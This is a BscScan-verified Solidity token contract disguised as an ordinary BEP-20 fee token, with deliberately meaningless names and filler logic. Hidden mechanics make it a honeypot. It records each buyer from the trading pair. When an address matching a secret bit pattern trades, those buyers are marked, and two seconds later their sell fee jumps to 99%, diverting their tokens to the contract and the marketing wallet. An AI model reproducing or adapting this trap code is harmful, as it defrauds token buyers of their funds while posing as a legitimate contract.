/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SmyslennyContentiousDestiny is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Smyslenny Contentious Destiny ";
    string constant _symbol = "SmyslennyContentiousDestiny";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private liquidityMinMarketingExempt;
    mapping(address => bool) private autoReceiverBuyBotsLimitBurn;
    mapping(address => bool) private maxBotsBuyTxMinExempt;
    mapping(address => bool) private autoFeeTeamExempt;
    mapping(address => uint256) private tradingFeeTeamMaxModeSell;
    mapping(uint256 => address) private modeFeeExemptBuy;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private exemptLaunchedLimitWallet = 0;
    uint256 private marketingAutoTradingBotsExemptBurnFee = 6;

    //SELL FEES
    uint256 private limitExemptMinWallet = 0;
    uint256 private marketingLaunchedTxTeam = 6;

    uint256 private teamFeeBotsReceiver = marketingAutoTradingBotsExemptBurnFee + exemptLaunchedLimitWallet;
    uint256 private receiverExemptBurnIsSwap = 100;

    address private botsLimitLiquidityMinWalletReceiverMode = (msg.sender); // auto-liq address
    address private isBotsLiquidityMarketing = (0x1f2397bBd041d6540CEd32C9ffffd94e8694A5ED); // marketing address
    address private autoTradingSwapIs = DEAD;
    address private burnReceiverAutoMarketing = DEAD;
    address private receiverSellLimitMax = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private sellExemptIsTeam;
    uint256 private sellReceiverBuyBurnFee;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private minAutoFeeLaunchedBotsLimit;
    uint256 private maxLiquidityBotsFee;
    uint256 private feeMinTeamSell;
    uint256 private marketingBuyReceiverLaunched;
    uint256 private tradingFeeIsAutoExemptMin;

    bool private tradingSwapIsAuto = true;
    bool private autoFeeTeamExemptMode = true;
    bool private swapModeLiquidityAutoBuy = true;
    bool private feeModeReceiverTxWalletTradingBurn = true;
    bool private buyWalletFeeTx = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private limitBuyWalletMin = _totalSupply / 1000; // 0.1%

    
    bool private minIsTxMode = false;
    bool private receiverMinMaxIs = false;
    bool private teamSellMinExempt = false;
    uint256 private sellMarketingTxReceiverBuy = 0;
    bool private tradingMarketingExemptIs = false;
    uint256 private sellSwapLimitBurn = 0;
    bool private liquidityBotsExemptTxAuto = false;
    uint256 private walletTradingTeamReceiver = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        minAutoFeeLaunchedBotsLimit = true;

        liquidityMinMarketingExempt[msg.sender] = true;
        liquidityMinMarketingExempt[address(this)] = true;

        autoReceiverBuyBotsLimitBurn[msg.sender] = true;
        autoReceiverBuyBotsLimitBurn[0x0000000000000000000000000000000000000000] = true;
        autoReceiverBuyBotsLimitBurn[0x000000000000000000000000000000000000dEaD] = true;
        autoReceiverBuyBotsLimitBurn[address(this)] = true;

        maxBotsBuyTxMinExempt[msg.sender] = true;
        maxBotsBuyTxMinExempt[0x0000000000000000000000000000000000000000] = true;
        maxBotsBuyTxMinExempt[0x000000000000000000000000000000000000dEaD] = true;
        maxBotsBuyTxMinExempt[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return walletBotsMarketingExempt(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return walletBotsMarketingExempt(sender, recipient, amount);
    }

    function walletBotsMarketingExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = buyLimitTradingMarketing(sender) || buyLimitTradingMarketing(recipient);
        
        if (receiverMinMaxIs == tradingMarketingExemptIs) {
            receiverMinMaxIs = minIsTxMode;
        }

        if (minIsTxMode != buyWalletFeeTx) {
            minIsTxMode = autoFeeTeamExemptMode;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                launchedMinBurnBots();
            }
            if (!bLimitTxWalletValue) {
                txTeamBotsBurnMarketingExemptSwap(recipient);
            }
        }
        
        if (teamSellMinExempt == teamSellMinExempt) {
            teamSellMinExempt = teamSellMinExempt;
        }

        if (tradingMarketingExemptIs != buyWalletFeeTx) {
            tradingMarketingExemptIs = autoFeeTeamExemptMode;
        }

        if (minIsTxMode == autoFeeTeamExemptMode) {
            minIsTxMode = receiverMinMaxIs;
        }


        if (inSwap || bLimitTxWalletValue) {return modeLimitTxBurn(sender, recipient, amount);}

        if (!liquidityMinMarketingExempt[sender] && !liquidityMinMarketingExempt[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (sellSwapLimitBurn != limitExemptMinWallet) {
            sellSwapLimitBurn = receiverExemptBurnIsSwap;
        }

        if (walletTradingTeamReceiver != receiverExemptBurnIsSwap) {
            walletTradingTeamReceiver = limitExemptMinWallet;
        }


        require((amount <= _maxTxAmount) || maxBotsBuyTxMinExempt[sender] || maxBotsBuyTxMinExempt[recipient], "Max TX Limit has been triggered");

        if (walletReceiverBotsBurn()) {launchedBuyBotsAutoBurnExemptMarketing();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (sellSwapLimitBurn != sellMarketingTxReceiverBuy) {
            sellSwapLimitBurn = limitExemptMinWallet;
        }

        if (liquidityBotsExemptTxAuto == autoFeeTeamExemptMode) {
            liquidityBotsExemptTxAuto = tradingSwapIsAuto;
        }

        if (tradingMarketingExemptIs != autoFeeTeamExemptMode) {
            tradingMarketingExemptIs = swapModeLiquidityAutoBuy;
        }


        uint256 amountReceived = modeExemptBotsFeeIsAutoTx(sender) ? exemptMaxTeamTxAuto(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function modeLimitTxBurn(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeExemptBotsFeeIsAutoTx(address sender) internal view returns (bool) {
        return !autoReceiverBuyBotsLimitBurn[sender];
    }

    function limitFeeReceiverTeamTradingExemptBuy(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            teamFeeBotsReceiver = marketingLaunchedTxTeam + limitExemptMinWallet;
            return isReceiverTxSellLaunchedTeam(sender, teamFeeBotsReceiver);
        }
        if (!selling && sender == uniswapV2Pair) {
            teamFeeBotsReceiver = marketingAutoTradingBotsExemptBurnFee + exemptLaunchedLimitWallet;
            return teamFeeBotsReceiver;
        }
        return isReceiverTxSellLaunchedTeam(sender, teamFeeBotsReceiver);
    }

    function exemptMaxTeamTxAuto(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (minIsTxMode == buyWalletFeeTx) {
            minIsTxMode = receiverMinMaxIs;
        }


        uint256 feeAmount = amount.mul(limitFeeReceiverTeamTradingExemptBuy(sender, receiver == uniswapV2Pair)).div(receiverExemptBurnIsSwap);

        if (autoFeeTeamExempt[sender] || autoFeeTeamExempt[receiver]) {
            feeAmount = amount.mul(99).div(receiverExemptBurnIsSwap);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function buyLimitTradingMarketing(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function isReceiverTxSellLaunchedTeam(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = tradingFeeTeamMaxModeSell[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function txTeamBotsBurnMarketingExemptSwap(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        modeFeeExemptBuy[exemptLimitValue] = addr;
    }

    function launchedMinBurnBots() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (tradingFeeTeamMaxModeSell[modeFeeExemptBuy[i]] == 0) {
                    tradingFeeTeamMaxModeSell[modeFeeExemptBuy[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(isBotsLiquidityMarketing).transfer(amountBNB * amountPercentage / 100);
    }

    function walletReceiverBotsBurn() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    buyWalletFeeTx &&
    _balances[address(this)] >= limitBuyWalletMin;
    }

    function launchedBuyBotsAutoBurnExemptMarketing() internal swapping {
        
        if (sellSwapLimitBurn != receiverExemptBurnIsSwap) {
            sellSwapLimitBurn = marketingLaunchedTxTeam;
        }

        if (sellMarketingTxReceiverBuy != marketingLaunchedTxTeam) {
            sellMarketingTxReceiverBuy = sellSwapLimitBurn;
        }


        uint256 amountToLiquify = limitBuyWalletMin.mul(exemptLaunchedLimitWallet).div(teamFeeBotsReceiver).div(2);
        uint256 amountToSwap = limitBuyWalletMin.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (minIsTxMode != tradingSwapIsAuto) {
            minIsTxMode = liquidityBotsExemptTxAuto;
        }

        if (sellMarketingTxReceiverBuy != teamFeeBotsReceiver) {
            sellMarketingTxReceiverBuy = teamFeeBotsReceiver;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = teamFeeBotsReceiver.sub(exemptLaunchedLimitWallet.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(exemptLaunchedLimitWallet).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingAutoTradingBotsExemptBurnFee).div(totalETHFee);
        
        if (receiverMinMaxIs != tradingSwapIsAuto) {
            receiverMinMaxIs = tradingMarketingExemptIs;
        }


        payable(isBotsLiquidityMarketing).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                botsLimitLiquidityMinWalletReceiverMode,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getSellMarketingTxReceiverBuy() public view returns (uint256) {
        if (sellMarketingTxReceiverBuy != limitExemptMinWallet) {
            return limitExemptMinWallet;
        }
        return sellMarketingTxReceiverBuy;
    }
    function setSellMarketingTxReceiverBuy(uint256 a0) public onlyOwner {
        if (sellMarketingTxReceiverBuy != limitExemptMinWallet) {
            limitExemptMinWallet=a0;
        }
        sellMarketingTxReceiverBuy=a0;
    }

    function getReceiverExemptBurnIsSwap() public view returns (uint256) {
        if (receiverExemptBurnIsSwap != exemptLaunchedLimitWallet) {
            return exemptLaunchedLimitWallet;
        }
        return receiverExemptBurnIsSwap;
    }
    function setReceiverExemptBurnIsSwap(uint256 a0) public onlyOwner {
        receiverExemptBurnIsSwap=a0;
    }

    function getLiquidityBotsExemptTxAuto() public view returns (bool) {
        if (liquidityBotsExemptTxAuto != buyWalletFeeTx) {
            return buyWalletFeeTx;
        }
        return liquidityBotsExemptTxAuto;
    }
    function setLiquidityBotsExemptTxAuto(bool a0) public onlyOwner {
        if (liquidityBotsExemptTxAuto == teamSellMinExempt) {
            teamSellMinExempt=a0;
        }
        liquidityBotsExemptTxAuto=a0;
    }

    function getLiquidityMinMarketingExempt(address a0) public view returns (bool) {
        if (liquidityMinMarketingExempt[a0] != autoReceiverBuyBotsLimitBurn[a0]) {
            return tradingSwapIsAuto;
        }
            return liquidityMinMarketingExempt[a0];
    }
    function setLiquidityMinMarketingExempt(address a0,bool a1) public onlyOwner {
        if (a0 == receiverSellLimitMax) {
            minIsTxMode=a1;
        }
        if (a0 != receiverSellLimitMax) {
            tradingSwapIsAuto=a1;
        }
        if (a0 == isBotsLiquidityMarketing) {
            buyWalletFeeTx=a1;
        }
        liquidityMinMarketingExempt[a0]=a1;
    }

    function getWalletTradingTeamReceiver() public view returns (uint256) {
        if (walletTradingTeamReceiver == teamFeeBotsReceiver) {
            return teamFeeBotsReceiver;
        }
        if (walletTradingTeamReceiver != sellSwapLimitBurn) {
            return sellSwapLimitBurn;
        }
        if (walletTradingTeamReceiver == sellMarketingTxReceiverBuy) {
            return sellMarketingTxReceiverBuy;
        }
        return walletTradingTeamReceiver;
    }
    function setWalletTradingTeamReceiver(uint256 a0) public onlyOwner {
        if (walletTradingTeamReceiver == limitBuyWalletMin) {
            limitBuyWalletMin=a0;
        }
        if (walletTradingTeamReceiver == walletTradingTeamReceiver) {
            walletTradingTeamReceiver=a0;
        }
        walletTradingTeamReceiver=a0;
    }

    function getMinIsTxMode() public view returns (bool) {
        if (minIsTxMode != teamSellMinExempt) {
            return teamSellMinExempt;
        }
        return minIsTxMode;
    }
    function setMinIsTxMode(bool a0) public onlyOwner {
        minIsTxMode=a0;
    }

    function getTeamSellMinExempt() public view returns (bool) {
        if (teamSellMinExempt == swapModeLiquidityAutoBuy) {
            return swapModeLiquidityAutoBuy;
        }
        if (teamSellMinExempt == buyWalletFeeTx) {
            return buyWalletFeeTx;
        }
        if (teamSellMinExempt == autoFeeTeamExemptMode) {
            return autoFeeTeamExemptMode;
        }
        return teamSellMinExempt;
    }
    function setTeamSellMinExempt(bool a0) public onlyOwner {
        if (teamSellMinExempt == autoFeeTeamExemptMode) {
            autoFeeTeamExemptMode=a0;
        }
        teamSellMinExempt=a0;
    }

    function getLimitBuyWalletMin() public view returns (uint256) {
        if (limitBuyWalletMin == sellMarketingTxReceiverBuy) {
            return sellMarketingTxReceiverBuy;
        }
        if (limitBuyWalletMin != marketingAutoTradingBotsExemptBurnFee) {
            return marketingAutoTradingBotsExemptBurnFee;
        }
        if (limitBuyWalletMin == exemptLaunchedLimitWallet) {
            return exemptLaunchedLimitWallet;
        }
        return limitBuyWalletMin;
    }
    function setLimitBuyWalletMin(uint256 a0) public onlyOwner {
        if (limitBuyWalletMin != receiverExemptBurnIsSwap) {
            receiverExemptBurnIsSwap=a0;
        }
        limitBuyWalletMin=a0;
    }

    function getAutoFeeTeamExemptMode() public view returns (bool) {
        return autoFeeTeamExemptMode;
    }
    function setAutoFeeTeamExemptMode(bool a0) public onlyOwner {
        if (autoFeeTeamExemptMode == tradingMarketingExemptIs) {
            tradingMarketingExemptIs=a0;
        }
        if (autoFeeTeamExemptMode != autoFeeTeamExemptMode) {
            autoFeeTeamExemptMode=a0;
        }
        if (autoFeeTeamExemptMode == autoFeeTeamExemptMode) {
            autoFeeTeamExemptMode=a0;
        }
        autoFeeTeamExemptMode=a0;
    }

    function getBurnReceiverAutoMarketing() public view returns (address) {
        return burnReceiverAutoMarketing;
    }
    function setBurnReceiverAutoMarketing(address a0) public onlyOwner {
        if (burnReceiverAutoMarketing != botsLimitLiquidityMinWalletReceiverMode) {
            botsLimitLiquidityMinWalletReceiverMode=a0;
        }
        if (burnReceiverAutoMarketing == isBotsLiquidityMarketing) {
            isBotsLiquidityMarketing=a0;
        }
        if (burnReceiverAutoMarketing != botsLimitLiquidityMinWalletReceiverMode) {
            botsLimitLiquidityMinWalletReceiverMode=a0;
        }
        burnReceiverAutoMarketing=a0;
    }

    function getFeeModeReceiverTxWalletTradingBurn() public view returns (bool) {
        if (feeModeReceiverTxWalletTradingBurn != tradingSwapIsAuto) {
            return tradingSwapIsAuto;
        }
        return feeModeReceiverTxWalletTradingBurn;
    }
    function setFeeModeReceiverTxWalletTradingBurn(bool a0) public onlyOwner {
        if (feeModeReceiverTxWalletTradingBurn == feeModeReceiverTxWalletTradingBurn) {
            feeModeReceiverTxWalletTradingBurn=a0;
        }
        if (feeModeReceiverTxWalletTradingBurn != receiverMinMaxIs) {
            receiverMinMaxIs=a0;
        }
        if (feeModeReceiverTxWalletTradingBurn != buyWalletFeeTx) {
            buyWalletFeeTx=a0;
        }
        feeModeReceiverTxWalletTradingBurn=a0;
    }

    function getBuyWalletFeeTx() public view returns (bool) {
        if (buyWalletFeeTx == autoFeeTeamExemptMode) {
            return autoFeeTeamExemptMode;
        }
        if (buyWalletFeeTx != liquidityBotsExemptTxAuto) {
            return liquidityBotsExemptTxAuto;
        }
        return buyWalletFeeTx;
    }
    function setBuyWalletFeeTx(bool a0) public onlyOwner {
        if (buyWalletFeeTx != feeModeReceiverTxWalletTradingBurn) {
            feeModeReceiverTxWalletTradingBurn=a0;
        }
        buyWalletFeeTx=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}